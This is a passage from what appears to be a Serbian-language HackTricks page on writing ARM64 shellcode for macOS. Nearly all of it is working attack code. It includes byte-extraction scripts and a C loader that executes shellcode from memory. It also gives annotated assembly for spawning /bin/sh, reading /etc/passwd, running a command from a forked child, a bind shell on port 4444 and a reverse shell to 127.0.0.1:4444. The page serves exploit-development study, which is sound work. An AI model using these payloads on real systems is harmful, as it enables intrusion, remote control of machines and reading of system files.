ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
Da biste izvukli bajtove:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
Za novije macOS:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
done
```
<details>

<summary>C kod za testiranje shellcode-a</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

Preuzeto sa [**ovde**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) i objašnjeno.

{{#tabs}}
{{#tab name="with adr"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}

{{#tab name="sa stekom"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{{#endtab}}

{{#tab name="sa adr za linux"}}
```armasm
; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}
{{#endtabs}}

#### Čitaj sa cat

Cilj je izvršiti `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, tako da je drugi argument (x1) niz parametara (što u memoriji znači stek adresa).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### Pozovite komandu sa sh iz fork-a tako da glavni proces ne bude ubijen
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Bind shell

Bind shell sa [https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s) na **portu 4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Obrnuta ljuska

Sa [https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s), revshell na **127.0.0.1:4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
{{#include ../../../banners/hacktricks-training.md}}
